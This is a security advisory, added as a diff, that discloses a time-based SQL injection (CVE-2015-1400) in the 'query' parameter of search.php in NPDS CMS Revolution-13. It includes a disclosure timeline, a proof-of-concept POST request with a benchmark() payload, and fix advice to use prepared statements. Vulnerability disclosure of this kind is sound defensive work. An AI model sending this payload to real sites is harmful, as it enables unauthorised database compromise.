@@ -1,0 +1,127 @@
+Title -  NPDS CMS Revolution-13 - SQL Injection Vulnerability
+
+Credits & Author: 
+Narendra Bhati  (  R00t Sh3ll ) 
+www.websecgeeks.com
+
+References (Source):
+====================
+http://www.npds.org/viewtopic.php?topic=26233&forum=12
+http://websecgeeks.com/npds-cms-sql-injection/
+
+Release Date:
+=============
+24-01-2015
+
+
+CVE ID :
+====================================
+CVE-2015-1400
+
+
+
+Product & Service Introduction:
+===============================
+http://www.npds.org/
+
+Abstract Advisory Information:
+==============================
+Narendra Bhati ( R00t Sh3ll ) An Information Security Analyst In Pune ( India ) discovered a remote sql injection  vulnerability in the NPDS CMS .
+
+
+Vulnerability Disclosure Timeline:
+==================================
+25-01-2015 :  Public Disclosure
+
+
+Timeline Status:
+=================
+Reported To Vendor  14-12-2014 
+Verified By Vendor 15-12-2014
+Acknowledge By Vendor 14-01-2015
+Public Disclosure By Vendor 24-01-2015
+Technical Disclosure  25-01-2015
+Vendor Security Advisory  http://www.npds.org/viewtopic.php?topic=26233&forum=12 
+Technical Disclosure - http://websecgeeks.com/npds-cms-sql-injection/
+CVE-2015-1400
+Mitigation For This Vulnerability  There Is No Update By Vendor , But That Will Be Out Soon !
+
+Affected Product(s):
+====================
+NPDS-Revolution-13
+
+Exploitation Technique:
+=======================
+Remote
+
+Severity Level:
+===============
+High
+
+
+Technical Details & Description:
+================================
+A sql injection web vulnerability has been discovered in the NPDS CMS - NPDS-Revolution-13.
+The vulnerability allows an attacker to inject sql commands by usage of a vulnerable value to compromise the application dbms.
+
+The sql injection vulnerability is located in the `query` parameter of the vulnerable `search.php ` application file. Remote attackers 
+are able to inject own sql commands by usage of vulnerable `search.php ` file. A successful attack requires to 
+manipulate a POST method request with vulnerable parameter `query` value to inject own sql commands. The injection is a time based ( tested ) by sql injection 
+that allows to compromise the web-application and connected dbms.
+
+Request Method(s):
+        [+] POST
+
+Vulnerable Module(s):
+        [+] NPDS-Revolution-13
+
+Vulnerable File(s):
+        [+] search.php
+
+Vulnerable Parameter(s):
+        [+] query
+
+
+Proof of Concept (PoC):
+=======================
+The remote sql injection web vulnerability can be exploited by remote attackers without privileged application user account.
+For reproduce the security vulnerability follow the provided information and steps below to continue.
+
+HTTP Request
+
+##### ==========
+POST /npds/search.php HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1/npds/index.php?op=edito
+Cookie: cookievalue
+Connection: keep-alive
+content-type:! application/x-www-form-urlencoded
+Content-Length: 63
+
+query=")and benchmark(20000000,sha1(1))-
+
+====================================
+Reference(s):
+http://www.npds.org/viewtopic.php?topic=26233&forum=12
+http://websecgeeks.com/npds-cms-sql-injection/
+
+
+Solution - Fix & Patch:
+=======================
+The vulnerability can be patched by a secure parse and encode of the vulnerability `query` parameter value in the search.php file.
+Use a prepared statement to fix the issues fully and setup own exception that prevents sql injection attacks.
+
+
+Security Risk:
+==============
+The security risk of the remote sql injection web vulnerability as critical
+
+
+Credits & Author:
+==================
+Narendra Bhati  (  R00t Sh3ll )
+www.websecgeeks.com
